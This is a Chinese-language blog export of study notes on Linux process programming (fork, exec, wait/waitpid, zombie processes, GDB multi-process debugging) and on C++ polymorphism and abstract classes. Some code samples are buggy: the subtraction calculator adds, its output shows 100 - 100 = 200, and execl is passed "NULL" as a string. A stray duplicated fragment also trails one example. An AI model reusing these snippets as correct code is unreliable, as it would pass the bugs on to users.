18","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"C++学习 Linux系统编程 进程使用","slug":"C++-学习-Linux系统编程-进程使用","date":"2023-05-04T08:37:55.000Z","updated":"2023-05-14T07:18:27.521Z","comments":true,"path":"2023/05/04/C++-学习-Linux系统编程-进程使用/","link":"","permalink":"http://example.com/2023/05/04/C++-%E5%AD%A6%E4%B9%A0-Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-%E8%BF%9B%E7%A8%8B%E4%BD%BF%E7%94%A8/","excerpt":"进程概述程序和进程程序","text":"进程概述程序和进程程序程序是包含一系列信息的文件，这些信息描述了如何在运行时创建一个进程： 二进制格式标识：每个程序文件都包含用于描述可执行文件格式的元信息。内核利用此信息来解释文件中的其他信息。（ELF可执行连接格式） 机器语言指令：对程序算法进行编码。 程序入口地址：标识程序开始执行时的起始指令位置。 数据：程序文件包含的变量初始值和程序使用的字面量值（比如字符串）。 符号表及重定位表：描述程序中函数和变量的位置及名称。这些表格有多重用途，其中包括调试和运行时的符号解析（动态链接）。 共享库和动态链接信息：程序文件所包含的一些字段，列出了程序运行时需要使用的共享库，以及加载共享库的动态连接器的路径名。 其他信息：程序文件还包含许多其他信息，用以描述如何创建进程 进程进程是正在运行的程序的实例。是一个具有一定独立功能的程序关于某个数据集合的一次运行活动。它是操作系统动态执行的基本单元，在传统的操作系统中，进程既是基本的分配单元，也是基本的执行单元。 程序和进程的关系可以用一个程序来创建多个进程，进程是由内核定义的抽象实体，并为该实体分配用以执行程序的各项系统资源。从内核的角度看，进程由用户内存空间和一系列内核数据结构组成，其中用户内存空间包含了程序代码及代码所使用的变量，而内核数据结构则用于维护进程状态信息。记录在内核数据结构中的信息包括许多与进程相关的标识号（IDs）、虚拟内存表、打开文件的描述符表、信号传递及处理的有关信息、进程资源使用及限制、当前工作目录和大量的其他信息 单道、多道程序设计 单道程序，即在计算机内存中只允许一个的程序运行。 多道程序设计技术是在计算机内存中同时存放几道相互独立的程序，使它们在管理程序控制下，相互穿插运行，两个或两个以上程序在计算机系统中同处于开始到结束之间的状态, 这些程序共享计算机系统资源。引入多道程序设计技术的根本目的是为了提高 CPU 的利用率。 对于一个单 CPU 系统来说，程序同时处于运行状态只是一种宏观上的概念，他们虽然都已经开始运行，但就微观而言，任意时刻，CPU 上运行的程序只有一个。 在多道程序设计模型中，多个进程轮流使用 CPU。而当下常见 CPU 为纳秒级，1秒可以执行大约 10 亿条指令。由于人眼的反应速度是毫秒级，所以看似同时在运行。 时间片 时间片（timeslice）又称为“量子（quantum）”或“处理器片（processor slice）”是操作系统分配给每个正在运行的进程微观上的一段 CPU 时间。事实上，虽然一台计算机通常可能有多个 CPU，但是同一个 CPU 永远不可能真正地同时运行多个任务。在只考虑一个 CPU 的情况下，这些进程“看起来像”同时运行的，实则是轮番穿插地运行，由于时间片通常很短（在 Linux 上为 5ms－800ms），用户不会感觉到。 时间片由操作系统内核的调度程序分配给每个进程。首先，内核会给每个进程分配相等的初始时间片，然后每个进程轮番地执行相应的时间，当所有进程都处于时间片耗尽的状态时，内核会重新为每个进程计算并分配时间片，如此往复 并行和并发 并行(parallel)：指在同一时刻，有多条指令在多个处理器上同时执行。 并发(concurrency)：指在同一时刻只能有一条指令执行，但多个进程指令被快速的轮换执行，使得在宏观上具有多个进程同时执行的效果，但在微观上并不是同时执行的，只是把时间分成若干段，使多个进程快速交替的执行 进程控制块PCB 为了管理进程，内核必须对每个进程所做的事情进行清楚的描述。内核为每个进程分配一个 PCB(Processing Control Block)进程控制块，维护进程相关的信息，Linux 内核的进程控制块是 task_struct 结构体。 在 &#x2F;usr&#x2F;src&#x2F;linux-headers-xxx&#x2F;include&#x2F;linux&#x2F;sched.h 文件中可以查看 struct task_struct 结构体定义。其内部成员有很多，我们只需要掌握以下部分即可： 进程id：系统中每个进程有唯一的 id，用 pid_t 类型表示，其实就是一个非负整数 进程的状态：有就绪、运行、挂起、停止等状态 进程切换时需要保存和恢复的一些CPU寄存器 描述虚拟地址空间的信息 描述控制终端的信息当前工作目录（Current Working Directory） umask 掩码 文件描述符表，包含很多指向 file 结构体的指针 和信号相关的信息 用户 id 和组 id 会话（Session）和进程组 进程可以使用的资源上限（Resource Limit）运行 1ulimit -a 进程状态转换进程的状态进程状态反映进程执行过程的变化。这些状态随着进程的执行和外界条件的变化而转换。在三态模型中，进程状态分为三个基本状态，即就绪态，运行态，阻塞态。在五态模型中，进程分为新建态、就绪态，运行态，阻塞态，终止态。 运行态：进程占有处理器正在运行 就绪态：进程具备运行条件，等待系统分配处理器以便运行。当进程已分配到除CPU以外的所有必要资源后，只要再获得CPU，便可立即执行。在一个系统中处于就绪状态的进程可能有多个，通常将它们排成一个队列，称为就绪队列 阻塞态：又称为等待(wait)态或睡眠(sleep)态，指进程不具备运行条件，正在等待某个事件的完成 新建态：进程刚被创建时的状态，尚未进入就绪队列 终止态：进程完成任务到达正常结束点，或出现无法克服的错误而异常终止，或被操作系统及有终止权的进程所终止时所处的状态。进入终止态的进程以后不再执行，但依然保留在操作系统中等待善后。一旦其他进程完成了对终止态进程的信息抽取之后，操作系统将删除该进程 进程相关命令 查看进程 1ps aux 1ps ajx a：显示终端上的所有进程，包括其他用户的进程 u：显示进程的详细信息 x：显示没有控制终端的进程 j：列出与作业相关的控制进程 还有其他的命令我们可以运行命令 1man ps STAT参数的意义 参数 意义 D 不可中断 Uninterruptible（usually IO） R 正在运行，或在队列中的进程 S 处于休眠状态 T 停止或被追踪 Z 僵尸进程 W 进入内存交换（从内核2.6开始无效） X 死掉的进程 &lt; 高优先级 N 低优先级 S 包含子进程 + 位于前台的进程组 实时显示进程动态 1top 可以在使用top命令时加上 -d来指定显示信息更新的时间间隔，在top命令执行后，可以按以下按键对显示结果进行排序 M 根据内存使用量排序 P 根据CPU占有率排序 T 根据进程运行时间长短排序 U 根据用户名来筛选进程 K 输入指定的PID杀死进程 杀死进程 klil [-signal] pid kill -l 列出所有信号 kill -SIGKILL 进程ID kill -9 进程ID killall name 根据进程名杀死进程 进程号和相关函数 每个进程都由进程号来标识，其类型为 pid_t（整型），进程号的范围：0～32767。进程号总是唯一的，但可以重用。当一个进程终止后，其进程号就可以再次使用。 任何进程（除 init 进程）都是由另一个进程创建，该进程称为被创建进程的父进程，对应的进程号称为父进程号（PPID）。 进程组是一个或多个进程的集合。他们之间相互关联，进程组可以接收同一终端的各种信号，关联的进程有一个进程组号（PGID）。默认情况下，当前的进程号会当做当前的进程组号。 进程号和进程相关函数 pid_t getpid(void); pid_t getppid(void); pid_t getpgid(pid_t pid); 进程创建fork函数系统允许一个进程创建新进程，新进程即为子进程，子进程还可以创建新的子进程，形成进程树结构模型。 123456789#include&lt;sys/types.h&gt;#include&lt;unistd.h&gt;pid_t fork(void);//返回值：//成功：子进程中返回0，父进程中返回子进程ID//失败：返回-1//失败的两个主要原因//1、当前系统的进程数已经达到了系统规定的上限，这时errno的值被设置为EAGAIN//2、系统内存不足，这是errno的值被设置为ENOMEM 例子： 123456789101112131415161718192021222324252627#include&lt;sys/types.h&gt;#include&lt;unistd.h&gt;#include&lt;stdio.h&gt;int main()&#123; //创建子进程 pid_t pid = fork(); //判断是父进程还是子进程 if (pid &gt; 0) &#123; printf(&quot;pid: %d\\n&quot;, pid); //如果大于0，返回的是创建的子进程的进程号 printf(&quot;I am parent process,pid: %d, ppid: %d\\n&quot;, getpid(), getppid()); &#125; else if (pid == 0) &#123; //当前是子进程 printf(&quot;I am child process,pid: %d, ppid: %d\\n&quot;, getpid(), getppid()); &#125; //for循环 for (int i = 0;i &lt; 5;i++) &#123; printf(&quot;i: %d pid: %d\\n&quot;, i,getpid()); sleep(2); &#125;&#125; 运行结果为： 第一个pid：107838是子进程的ID，父进程ID为107837，父进程的父进程的ID：107575 父进程和子进程是交替运行的 父子进程之间的关系： 区别： fork()函数的返回值不同 父进程中：&gt;0 返回子进程的ID 子进程中 &#x3D; 0 PCB中的一些数据有区别 当前进程的id，pid 当前进程的父进程id，ppid 信号集 共同点： 某些状态下：子进程刚创建出来，还没有执行任何的写数据的操作 用户区的数据 文件描述符表 父子进程对变量是不是共享的？ 刚开始的时候是一样的，是共享的，如果修改了数据就不共享了 读时共享（子进程被创建，两个进程没有做任何写的操作），写时拷贝 父子进程虚拟地址空间情况实际上，更准确来说，Linux的fork()使用是通过写时拷贝（copy - on - write）实现的。 写时拷贝是一种可以推迟甚至避免拷贝数据的技术。 内核此时并不复制整个进程的地址空间，而是让父子进程共享同一个地址空间。只用在需要写入的时候才会复制地址空间，从而使各个进程拥有各自的地址空间。 也就是说，资源的复制是在需要写入的时候才会运行，在此之前，只有以只读方式共享。 注意：fork之后父子进程共享文件。fork产生的子进程与父进程相同的文件，文件描述符指向相同的文件表，引用计数增加，共享文偏移指针。 GDB多进程调试使用 GDB 调试的时候，GDB 默认只能跟踪一个进程，可以在 fork 函数调用之前，通过指令设置 GDB 调试工具跟踪父进程或者是跟踪子进程，默认跟踪父进程。 设置调试父进程或者子进程：set follow-fork-mode [parent（默认）| child] 设置调试模式：set detach-on-fork [on | off]默认为 on，表示调试当前进程的时候，其它的进程继续运行，如果为 off，调试当前进程的时候，其它进程被 GDB 挂起。 查看调试的进程：info inferiors 切换当前调试的进程：inferior id 使进程脱离 GDB 调试：detach inferiors id 我们对如下程序进行GDB多进程调试： 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() &#123; printf(&quot;begin\\n&quot;); if(fork() &gt; 0) &#123; printf(&quot;我是父进程: pid = %d, ppid = %d\\n&quot;, getpid(), getppid()); int i; for(i = 0; i &lt; 10; i++) &#123; printf(&quot;i = %d\\n&quot;, i); sleep(1); &#125; &#125; else &#123; printf(&quot;我是子进程: pid = %d, ppid = %d\\n&quot;, getpid(), getppid()); int j; for(j = 0; j &lt; 10; j++) &#123; printf(&quot;j = %d\\n&quot;, j); sleep(1); &#125; &#125; return 0;&#125; 对上述程序进行调试：GDB默认调试的是父进程 我们可以通过指令,修改默认跟踪的进程 1set follow-fork-mode child 修改之后我们默认调试的是子进程 使用命令，更改调试模式off将子进程挂起 1set detach-on-fork off 我们重新调试程序 通过运行命令查看当前调试的进程 1info inferiors 我们运行命令切换到子进程继续调试 1inferior 2 我们再次切换到父进程调试，并且将父进程运行结束 此时我们查看进程 我们切换到子进程继续调试并且运行结束 我们运行命令，使父进程脱离调试 1detach inferiors 1 exec函数族exec函数族介绍 exec 函数族的作用是根据指定的文件名找到可执行文件，并用它来取代调用进程的内容，换句话说，就是在调用进程内部执行一个可执行文件。 exec 函数族的函数执行成功后不会返回，因为调用进程的实体，包括代码段，数据段和堆栈等都已经被新的内容取代，只留下进程 ID 等一些表面上的信息仍保持原样，颇有些神似“三十六计”中的“金蝉脱壳”。看上去还是旧的躯壳，却已经注入了新的灵魂。只有调用失败了，它们才会返回 -1，从原程序的调用点接着往下执行。 123456789int execl(const char *path, const char *arg, .../* (char *) NULL */);int execlp(const char *file, const char *arg, ... /* (char *) NULL */);int execle(const char *path, const char *arg, .../*, (char *) NULL, char * const envp[] */);int execv(const char *path, char *const argv[])int execvp(const char *file, char *const argv[]);int execvpe(const char *file, char *const argv[], char *const envp[]);//前六个是标准C库函数，最后一个是Linux系统函数int execve(const char *filename, char *const argv[], char *const envp[]); execl函数1234567891011#include&lt;unistd.h&gt;int execl(const char* path, const char* arg, .../* (char *) NULL */);//参数//- path：需要制定执行的文件的路径或者名称//- arg：是执行可执行文件所需要的参数列表// 第一个参数一般没有什么作用，一般写的是执行的程序的名称// 从第二个参数开始往后，就是程序执行所需要的参数列表// 参数最后需要以NULL结束（哨兵）//返回值//只有当调用失败才会有返回值，并且返回-1，并且设置errno//如果调用成功，没有返回值 例子： 12345678910111213141516171819202122#include&lt;unistd.h&gt;#include&lt;stdio.h&gt;int main()&#123; //创建一个子进程，在子进程中执行exec函数族中的程序 __pid_t pid = fork(); if (pid &gt; 0) &#123; //父进程 printf(&quot;i am parent process,pid : %d\\n&quot;, getpid()); &#125; else if (pid == 0) &#123; //子进程 execl(&quot;hello&quot;, &quot;hello&quot;, &quot;NULL&quot;); printf(&quot;i am child process,pid : %d\\n&quot;,getpid()); &#125; for (int i = 0;i &lt; 3;i++) &#123; printf(&quot;i = %d,pid = %d\\n&quot;, i, getpid()); &#125;&#125; hello文件是一段输出hello world的代码 代码运行结果如下： 12345678910111213141516171819202122#include&lt;unistd.h&gt;#include&lt;stdio.h&gt;int main()&#123; //创建一个子进程，在子进程中执行exec函数族中的程序 __pid_t pid = fork(); if (pid &gt; 0) &#123; //父进程 printf(&quot;i am parent process,pid : %d\\n&quot;, getpid()); &#125; else if (pid == 0) &#123; //子进程 execl(&quot;/bin/ps&quot;, &quot;ps&quot;, &quot;aux&quot;, NULL); printf(&quot;i am child process,pid : %d\\n&quot;,getpid()); &#125; for (int i = 0;i &lt; 3;i++) &#123; printf(&quot;i = %d,pid = %d\\n&quot;, i, getpid()); &#125;&#125; 这段代码会将子进程替代为运行Linux系统程序ps execlp函数12345#include&lt;unistd.h&gt;int execlp(const char* file, const char* arg, ... /* (char *) NULL */);//参数//- 会到环境变量中寻找可执行文件，如果找到则执行，如果找不到则执行失败//- file：需要可执行文件的文件名 例子: 12345678910111213141516171819202122#include&lt;unistd.h&gt;#include&lt;stdio.h&gt;int main()&#123; //创建一个子进程，在子进程中执行exec函数族中的程序 __pid_t pid = fork(); if (pid &gt; 0) &#123; //父进程 printf(&quot;i am parent process,pid : %d\\n&quot;, getpid()); &#125; else if (pid == 0) &#123; //子进程 execlp(&quot;ps&quot;, &quot;ps&quot;, &quot;aux&quot;, NULL); printf(&quot;i am child process,pid : %d\\n&quot;,getpid()); &#125; for (int i = 0;i &lt; 3;i++) &#123; printf(&quot;i = %d,pid = %d\\n&quot;, i, getpid()); &#125;&#125; 与execl不同，execlp不用写入绝对路径就可以执行ps命令 进程控制进程退出 1234567#include&lt;stdlib.h&gt;void exit(int status);#include&lt;unistd.h&gt;void _exit(int status);//status是进程退出时的一个状态信息。父进程回收子进程资源时可以获取到 例子： 12345678910#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;stdio.h&gt;int main()&#123; printf(&quot;hello\\n&quot;); printf(&quot;world&quot;); exit(0);&#125; 12345678910#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;stdio.h&gt;int main()&#123; printf(&quot;hello\\n&quot;); printf(&quot;world&quot;); _exit(0);&#125; 如果使用_exit(0)则只会打印hello不会打印world 孤儿进程 父进程运行结束，但子进程还在运行（未运行结束），这样的子进程就称为孤儿进程（Orphan Process）。 每当出现一个孤儿进程的时候，内核就把孤儿进程的父进程设置为 init ，而 init 进程会循环地 wait() 它的已经退出的子进程。这样，当一个孤儿进程凄凉地结束了其生命周期的时候，init 进程就会代表党和政府出面处理它的一切善后工作。 因此孤儿进程并不会有什么危害 僵尸进程 每个进程结束之后, 都会释放自己地址空间中的用户区数据，内核区的 PCB 没有办法自己释放掉，需要父进程去释放。 进程终止时，父进程尚未回收，子进程残留资源（PCB）存放于内核中，变成僵尸（Zombie）进程。 僵尸进程不能被 kill -9 杀死，这样就会导致一个问题，如果父进程不调用 wait() 或 waitpid() 的话，那么保留的那段信息就不会释放，其进程号就会一直被占用，但是系统所能使用的进程号是有限的，如果大量的产生僵尸进程，将因为没有可用的进程号而导致系统不能产生新的进程，此即为僵尸进程的危害，应当避免 进程回收 在每个进程退出的时候，内核释放该进程所有的资源、包括打开的文件、占用的内存等。但是仍然为其保留一定的信息，这些信息主要主要指进程控制块PCB的信息（包括进程号、退出状态、运行时间等）。 父进程可以通过调用wait或waitpid得到它的退出状态同时彻底清除掉这个进程。 wait() 和 waitpid() 函数的功能一样，区别在于，wait() 函数会阻塞，waitpid() 可以设置不阻塞，waitpid() 还可以指定等待哪个子进程结束。 注意：一次wait或waitpid调用只能清理一个子进程，清理多个子进程应使用循环。 wait()函数1234567891011#include&lt;sys/types.h&gt;#include&lt;sys/wait.h&gt;pid_t wait(int* wstatus);//功能：等待任意一个子进程结束，如果任意一个子进程结束了，此函数会回收//参数：//进程退出时的状态信息，传入的是一个int类型的地址，传出参数//返回值：//- 成功：返回被回收的子进程的ID//- 失败：返回-1(所有子进程都结束//调用wait函数的进程会被挂起(阻塞)，直到它的一个子进程退出或者收到一个不能忽略的信号（继续被执行)//如果没有子进程，函数会立刻返回-1；如果子进程都已经结束了，也会立即返回-1，并且会回收子进程的资源 案例wait.c程序： 1234567891011121314151617181920212223242526272829#include&lt;sys/types.h&gt;#include&lt;sys/wait.h&gt;#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;int main()&#123; //有一个父进程创建五个子进程 pid_t pid; //创建五个子进程 for (int i = 0;i &lt; 5;i++) &#123; pid = fork(); if (pid == 0) break; &#125; if (pid &gt; 0) &#123; //父进程 while (1) &#123; printf(&quot;parent,pid = %d\\n&quot;, getpid()); &#125; &#125; else if (pid == 0) &#123; //子进程 printf(&quot;child,pid = %d\\n&quot;, getpid()); &#125;&#125; 我们编译运行这段程序 运行命令 1ps aux 我们发现wait程序生成的五个子进程变为了僵尸进程 我们重新写一段wait.c程序，通过kill将子程序杀死 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;int main() &#123; // 有一个父进程，创建5个子进程（兄弟） pid_t pid; // 创建5个子进程 for(int i = 0; i &lt; 5; i++) &#123; pid = fork(); if(pid == 0) &#123; break; &#125; &#125; if(pid &gt; 0) &#123; // 父进程 while(1) &#123; printf(&quot;parent, pid = %d\\n&quot;, getpid()); // int ret = wait(NULL); int st; int ret = wait(&amp;st); if(ret == -1) &#123; break; &#125; if(WIFEXITED(st)) &#123; // 是不是正常退出 printf(&quot;退出的状态码：%d\\n&quot;, WEXITSTATUS(st)); &#125; if(WIFSIGNALED(st)) &#123; // 是不是异常终止 printf(&quot;被哪个信号干掉了：%d\\n&quot;, WTERMSIG(st)); &#125; printf(&quot;child die, pid = %d\\n&quot;, ret); sleep(1); &#125; &#125; else if (pid == 0)&#123; // 子进程 while(1) &#123; printf(&quot;child, pid = %d\\n&quot;,getpid()); sleep(1); &#125; exit(0); &#125; return 0; // exit(0)&#125;&quot;, getpid()); &#125; &#125;&#125; 使用kill命令杀死子进程 kill之后的运行结果为： 退出信息相关宏函数1234567WIFEXITED(status) //非0，进程正常退出WEXITSTATUS(status) //如果上宏为真，获取进程退出的状态（exit的参数）WIFSIGNALED(status) //非0，进程异常终止WTERMSIG(status) //如果上宏为真，获取使进程终止的信号编号WIFSTOPPED(status) //非0，进程处于暂停状态WSTOPSIG(status) //如果上宏为真，获取使进程暂停的信号的编号WIFCONTINUED(status) //非0，进程暂停后已经继续运行 waitpid()函数123456789101112131415#include &lt;sys/types.h&gt;#include&lt;sys/wait.h&gt;pid_t waitpid(pid_t pid, int* wstatus, int options);//功能：回收指定进程号的进程，可设置是否阻塞//参数：//- pid// pid&gt;0：某个子进程的pid// pid=0：回收当前进程组的所有子进程// pid=-1：表示回收所有的子进程，相当于wait() 最常用// pid&lt;-1：某个进程组的组id的绝对值，回收指定进程组中的子进程//- options：设置阻塞或者非阻塞，0表示阻塞，WNOHANG表示非阻塞//- 返回值// &gt;0：返回子进程ID// =0：options=WNOHANG，表示还有子进程// =-1：错误，或者没有子进程","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"Linux系统编程","slug":"编程语言/C/Linux系统编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"进程","slug":"进程","permalink":"http://example.com/tags/%E8%BF%9B%E7%A8%8B/"}]},{"title":"C++学习 多态","slug":"C++-学习-多态","date":"2023-05-04T01:11:10.000Z","updated":"2023-05-09T08:10:41.368Z","comments":true,"path":"2023/05/04/C++-学习-多态/","link":"","permalink":"http://example.com/2023/05/04/C++-%E5%AD%A6%E4%B9%A0-%E5%A4%9A%E6%80%81/","excerpt":"多态的基本概念多态是C++面向对象三大特性之一 多态分为两类：","text":"多态的基本概念多态是C++面向对象三大特性之一 多态分为两类： 静态多态：函数重载和运算符重载属于静态多态，复用函数名 动态多态：派生类和虚函数实现运行时多态 静态多态和动态多态区别 静态多态的函数地址早绑定-编译阶段确定函数地址 动态多态的函数地址晚绑定-运行阶段确定函数地址 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//多态//动物类class Animal&#123;public: void speak() &#123; cout &lt;&lt; &quot;动物在说话&quot; &lt;&lt; endl; &#125; &#125;;//猫类class Cat :public Animal&#123;public: void speak() &#123; cout &lt;&lt; &quot;小猫在说话&quot; &lt;&lt; endl; &#125;&#125;;//执行说话的函数//地址早绑定 在编译阶段确定函数地址 //如果想执行让猫说话，那么这个函数地址就不能提前绑定，需要在运行阶段进行绑定，地址晚绑定void doSpeak(Animal&amp; animal)&#123; animal.speak();&#125;void test01()&#123; Cat cat; doSpeak(cat);&#125;int main()&#123; test01();&#125; 运行结果为： 动物在说话 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//多态//动物类class Animal&#123;public: virtual void speak() &#123; cout &lt;&lt; &quot;动物在说话&quot; &lt;&lt; endl; &#125; &#125;;//动态多态满足条件// 1、具有继承关系// 2、子类要重写父类的虚函数// // 动态多态的使用// 父类的指针或引用指向子类的应用// //猫类class Cat :public Animal&#123;public: void speak() &#123; cout &lt;&lt; &quot;小猫在说话&quot; &lt;&lt; endl; &#125;&#125;;class Dog :public Animal&#123;public: void speak() &#123; cout &lt;&lt; &quot;小狗在说话&quot; &lt;&lt; endl; &#125;&#125;;//执行说话的函数//地址早绑定 在编译阶段确定函数地址 //如果想执行让猫说话，那么这个函数地址就不能提前绑定，需要在运行阶段进行绑定，地址晚绑定void doSpeak(Animal&amp; animal)&#123; animal.speak();&#125;void test01()&#123; Cat cat; doSpeak(cat); Dog dog; doSpeak(dog);&#125;int main()&#123; test01();&#125; 运行结果为： 小猫在说话小狗在说话 动态多态满足条件 具有继承关系 子类要重写父类的虚函数 动态多态的使用 父类的指针或引用指向子类对象 多态的原理剖析我们观察上述代码的Animal类结构,vfptr指向vftable 我们观察Cat类的结构如下： 当父类指针或者引用指向子类对象的时候发生多态，即 Animal&amp; animal = cat animal.speak() 当传入的对象是cat那么就是从cat的虚函数表里调用虚函数 多态案例一 计算器类案例描述：分别利用普通写法和多态技术，设计两个操作数进行运算的计算器类 多态的优点： 代码组织结构清晰 可读性强 利于前期和后期的拓展以及维护 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//分别利用普通写法和多态写法实现计算器//普通写法class Calculator&#123;public: int getResult(string oper) &#123; if (oper == &quot;+&quot;)return m_Num1 + m_Num2; else if(oper == &quot;-&quot;)return m_Num1 - m_Num2; else if (oper == &quot;*&quot;)return m_Num1 * m_Num2; else if (oper == &quot;/&quot;)return m_Num1 / m_Num2; &#125; //如果要拓展新的功能，需要拓展源码 //在真实的开发中提倡开闭原则 //对拓展进行开发，对修改进行关闭 int m_Num1;//操作数1 int m_Num2;//操作数2&#125;;void test01()&#123; Calculator c; c.m_Num1 = 10; c.m_Num2 = 10; cout &lt;&lt; c.m_Num1 &lt;&lt; &quot; + &quot; &lt;&lt; c.m_Num2 &lt;&lt; &quot; = &quot; &lt;&lt; c.getResult(&quot;+&quot;) &lt;&lt; endl; cout &lt;&lt; c.m_Num1 &lt;&lt; &quot; - &quot; &lt;&lt; c.m_Num2 &lt;&lt; &quot; = &quot; &lt;&lt; c.getResult(&quot;-&quot;) &lt;&lt; endl; cout &lt;&lt; c.m_Num1 &lt;&lt; &quot; * &quot; &lt;&lt; c.m_Num2 &lt;&lt; &quot; = &quot; &lt;&lt; c.getResult(&quot;*&quot;) &lt;&lt; endl; cout &lt;&lt; c.m_Num1 &lt;&lt; &quot; / &quot; &lt;&lt; c.m_Num2 &lt;&lt; &quot; = &quot; &lt;&lt; c.getResult(&quot;/&quot;) &lt;&lt; endl;&#125;//利用多态实现计算器//实现计算机抽象类class AbstractCalculator&#123;public: virtual int getResult() &#123; return 0; &#125; int m_Num1; int m_Num2;&#125;;//加法计算器类class AddCalculator :public AbstractCalculator&#123;public: int getResult() &#123; return m_Num1 + m_Num2; &#125;&#125;;//减法计算器类class SubCalculator :public AbstractCalculator&#123;public: int getResult() &#123; return m_Num1 + m_Num2; &#125;&#125;;//乘法计算器类class MulCalculator :public AbstractCalculator&#123;public: int getResult() &#123; return m_Num1 * m_Num2; &#125;&#125;;//加法计算器类class DivCalculator :public AbstractCalculator&#123;public: int getResult() &#123; return m_Num1 / m_Num2; &#125;&#125;;void test02()&#123; //多态使用条件 //父类指针或者引用指向子类对象 //加法运算 AbstractCalculator* abc = new AddCalculator; abc-&gt;m_Num1 = 100; abc-&gt;m_Num2 = 100; cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; &quot; + &quot; &lt;&lt; abc-&gt;m_Num2 &lt;&lt; &quot; = &quot; &lt;&lt; abc-&gt;getResult() &lt;&lt; endl; //用完后记得销毁 delete abc; //减法运算 abc = new SubCalculator; abc-&gt;m_Num1 = 100; abc-&gt;m_Num2 = 100; cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; &quot; - &quot; &lt;&lt; abc-&gt;m_Num2 &lt;&lt; &quot; = &quot; &lt;&lt; abc-&gt;getResult() &lt;&lt; endl; //乘法运算 abc = new MulCalculator; abc-&gt;m_Num1 = 100; abc-&gt;m_Num2 = 100; cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; &quot; * &quot; &lt;&lt; abc-&gt;m_Num2 &lt;&lt; &quot; = &quot; &lt;&lt; abc-&gt;getResult() &lt;&lt; endl; //除法运算 abc = new DivCalculator; abc-&gt;m_Num1 = 100; abc-&gt;m_Num2 = 100; cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; &quot; / &quot; &lt;&lt; abc-&gt;m_Num2 &lt;&lt; &quot; = &quot; &lt;&lt; abc-&gt;getResult() &lt;&lt; endl;&#125;int main()&#123; test01(); test02(); &#125; 运行结果为： 10 + 10 &#x3D; 2010 - 10 &#x3D; 010 * 10 &#x3D; 10010 &#x2F; 10 &#x3D; 1100 + 100 &#x3D; 200100 - 100 &#x3D; 200100 * 100 &#x3D; 10000100 &#x2F; 100 &#x3D; 1 纯虚函数和抽象类在多态中，通常父类中虚函数的实现是毫无意义的，主要都是调用子类重写的内容 因此可以将虚函数改为纯虚函数 纯虚函数语法：virtual 返回值类型 函数名 (参数列表) = 0; 当类中有了纯虚函数，这个类也成为抽象类 抽象类特点： 无法实例化对象 子类必须重写抽象类中的纯虚函数，否则也属于抽象类 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//纯虚函数和抽象类class Base&#123;public: //纯虚函数 //只要有一个纯虚函数，这个类称为抽象类 //抽象类特点： //无法实例化对象 virtual void func() = 0;&#125;;void test01()&#123; Base b;&#125;int main()&#123; test01();&#125; 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//纯虚函数和抽象类class Base&#123;public: //纯虚函数 //只要有一个纯虚函数，这个类称为抽象类 //抽象类特点： //1、无法实例化对象 //2、抽象类的子类，必须要重写父类中的纯虚函数，否则也属于抽象类 virtual void func() = 0;&#125;;class Son :public Base&#123;&#125;;void test01()&#123; Son s;&#125;int main()&#123; test01();&#125; 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//纯虚函数和抽象类class Base&#123;public: //纯虚函数 //只要有一个纯虚函数，这个类称为抽象类 //抽象类特点： //1、无法实例化对象 //2、抽象类的子类，必须要重写父类中的纯虚函数，否则也属于抽象类 virtual void func() = 0;&#125;;class Son :public Base&#123; virtual void func() &#123; cout &lt;&lt; &quot;func函数调用&quot; &lt;&lt; endl; &#125;;&#125;;void test01()&#123; Son s;//子类必须重写父类中的纯虚函数，否则不能实例化对象 Base* base = new Son; base-&gt;func();&#125;int main()&#123; test01();&#125; 运行结果为： func函数调用 多态案例二 制作饮品案例描述：制作饮品的大致流程为：煮水-冲泡-倒入杯中-加入辅料 利用多态技术实现本案例，提供抽象制作饮品基类，提供子类制作咖啡和茶叶 